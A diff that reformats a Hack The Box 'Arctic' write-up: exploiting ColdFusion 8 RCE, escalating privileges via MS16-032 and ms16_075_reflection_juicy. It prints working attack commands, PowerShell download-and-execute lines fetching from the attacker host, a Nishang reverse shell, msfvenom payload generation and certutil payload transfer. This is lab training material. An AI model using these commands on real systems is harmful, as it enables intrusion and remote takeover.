@@ -26,8 +26,7 @@ Time to get bundled up because we are heading to the arctic!
 
 Per the usual, when need to derermine the running services by running nmap.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.11 
 [sudo] password for kali: 
@@ -55,8 +54,8 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 143.24 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Check the landing page the webserver is serving on port 8500.
@@ -88,8 +87,7 @@ Check the Cold Fusion login page.  Note the version 8 on the login page.
 <by />
 Check searchsploit for the cold fusion version.
 
-{% raw %}
-```bash
+{% capture searchsploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ searchsploit cold fusion 8                
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -126,24 +124,22 @@ Macromedia ColdFusion MX 6.0 - SQL Error Message Cross-Site Scripting           
 Macromedia ColdFusion MX 6.1 - Template Handling Privilege Escalation                                                                                                                                     | multiple/remote/24654.txt
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=searchsploit %}
 
 <br />
 Copy the exploit into the local working folder.
 
-{% raw %}
-```bash
+{% capture copylocalworkingfolder %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ cp `locate 50057.py` . 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=copylocalworkingfolder %}
 
 <br />
 Update the lhost, rhost, and lport with the appropriate values.
 
-{% raw %}
-```python
+{% capture cfexploit %}
 # Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
 # Google Dork: intext:"adobe coldfusion 8"
 # Date: 24/06/2021
@@ -171,14 +167,13 @@ if __name__ == '__main__':
     rhost = "10.10.10.11"
     rport = 8500
     filename = uuid.uuid4().hex
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='50057.py' content=cfexploit %}
 
 <br />
 Run the exploit and achieve code execution.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ python3 50057.py                
 
@@ -195,19 +190,24 @@ Listening for connection...
 Executing the payload...
 listening on [any] 4444 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.11] 49253
+{% endcapture %}
+
+{% capture catchfootholdshell %}
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 
 C:\ColdFusion8\runtime\bin>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=runexploit %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=catchfootholdshell %}
 
 <br />
 Run the whoami commands to get a sense the use that we are.
 
-{% raw %}
-```bash
+{% capture whoami %}
 C:\ColdFusion8\runtime\bin>whoami
 whoami
 arctic\tolis
@@ -224,14 +224,13 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=whoami %}
 
 <br />
 Run systeminfo to get a sense of the system.
 
-{% raw %}
-```bash
+{% capture systeminfo %}
 C:\ColdFusion8\runtime\bin>systeminfo
 systeminfo
 
@@ -273,14 +272,13 @@ Network Card(s):           1 NIC(s) Installed.
                                  DHCP Enabled:    No
                                  IP address(es)
                                  [01]: 10.10.10.11
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=systeminfo %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 C:\Users\tolis\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -307,34 +305,31 @@ Tunnel adapter Local Area Connection* 9:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . :
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}
 
 <br />
 Copy MS16032 into the local working folder.
 
-{% raw %}
-```bash
+{% capture cpms16032local %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ cp $(locate MS16032) .
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cpms16032local %}
 
 <br />
 Copy Nishang into the local working folder.
 
-{% raw %}
-```bash
+{% capture cpnishang %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ./shell.ps1
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cpnishang %}
 
 <br />
 Update MS16032 to download the shell.ps1 script.
 
-{% raw %}
-```powershell
+{% capture ms16032upd %}
 function Invoke-MS16-032 {
 <#
 .SYNOPSIS
@@ -384,14 +379,13 @@ function Invoke-MS16-032 {
 <snip>
 
 Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.12:8000/shell.ps1')"
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=ms16032upd %}
 
 <br />
 Update the shell.ps1 script to invoke the command to create the reverse shell.
 
-{% raw %}
-```powershell
+{% capture updatenishang %}
 function Invoke-PowerShellTcp 
 { 
 <#
@@ -436,36 +430,32 @@ https://github.com/samratashok/nishang
     <snip>
 
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.12 -Port 9999
-
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=updatenishang %}
 
 <br />
 Set-up a listener.
 
-{% raw %}
-```bash
+{% capture start9999listener %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ nc -nlvp 9999
 listening on [any] 9999 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start9999listener %}
 
 <br />
 Use PowerShell to download and execute MS16032 and notice that it freezes.  Restart connect the shell if necessary.
 
-{% raw %}
-```bash
+{% capture runms16032 %}
 C:\ColdFusion8\runtime\bin>powershell IEX(New-Object Net.Webclient).DownloadString('http://10.10.16.12:8000/Invoke-MS16032.ps1')
 powershell IEX(New-Object Net.Webclient).DownloadString('http://10.10.16.12:8000/Invoke-MS16032.ps1')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=runms16032 %}
 
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture generatemeter %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=4445 -f exe -o meter.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -478,14 +468,13 @@ Saved as: meter.exe
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=generatemeter %}
 
 <br />
 Start a metasploit multi/handler listener.
 
-{% raw %}
-```bash
+{% capture startmultihandler %}
 ┌──(kali㉿kali)-[~/Documents/htb/arctic]
 └─$ msfconsole -q
 msf6 > use exploit/multi/handler
@@ -500,50 +489,46 @@ msf6 exploit(multi/handler) > set lport 4445
 lport => 4445
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.10.16.12:4445
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startmultihandler %}
 
 <br />
 Transfer the meterpreter payload to the victim machine.
 
-{% raw %}
-```bash
+{% capture transfermeter %}
 C:\Users\tolis>certutil.exe -urlcache -f http://10.10.16.12:8000/meter.exe meter.exe
 certutil.exe -urlcache -f http://10.10.16.12:8000/meter.exe meter.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transfermeter %}
 
 <br />
 Execute the meterpreter payload.
 
-{% raw %}
-```bash
+{% capture runmeter %}
 C:\Users\tolis>.\meter.exe
 .\meter.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runmeter %}
 
 <br />
 Check the handler to catch the meterpreter session.
 
-{% raw %}
-```bash
+{% capture catchmeter %}
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.10.16.12:4445 
 [*] Sending stage (177734 bytes) to 10.10.10.11
 [*] Meterpreter session 1 opened (10.10.16.12:4445 -> 10.10.10.11:49449) at 2025-02-16 22:21:11 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchmeter %}
 
 <br />
 Background the session and run local_exploit_suggester.
 
-{% raw %}
-```bash
+{% capture runsuggester %}
 meterpreter > 
 Background session 1? [y/N]  y
 [-] Unknown command: y. Run the help command for more details.
@@ -599,14 +584,13 @@ Also please contact the author of logging-2.4.0 to request adding syslog into it
  11  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 
  <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runsuggester %}
 
 <br />
 Choose to use the reflection juicy exploit.
 
-{% raw %}
-```bash
+{% capture usejuicy %}
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_075_reflection_juicy
 [*] Using configured payload windows/meterpreter/reverse_tcp
 msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lhost tun0
@@ -631,14 +615,13 @@ msf6 exploit(windows/local/ms16_075_reflection_juicy) > exploit
 [*] Meterpreter session 2 opened (10.10.16.9:4446 -> 10.10.10.11:49262) at 2025-03-30 19:48:25 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=usejuicy %}
 
 <br />
 Migrate to a process that is running as SYSTEM.
 
-{% raw %}
-```bash
+{% capture migrateprocess %}
 meterpreter > ps
 
 Process List
@@ -657,14 +640,13 @@ Process List
 meterpreter > migrate 1000
 [*] Migrating from 4076 to 1000...
 [*] Migration completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=migrateprocess %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 <redacted>
@@ -691,8 +673,8 @@ Tunnel adapter Local Area Connection* 9:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . :
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}
 
 <br />
 Looks like our juicy reflection was enough to crack the harsh Arctic.  Hopefully, you enjoyed the read.  Look forwared to seeing you in the next one.
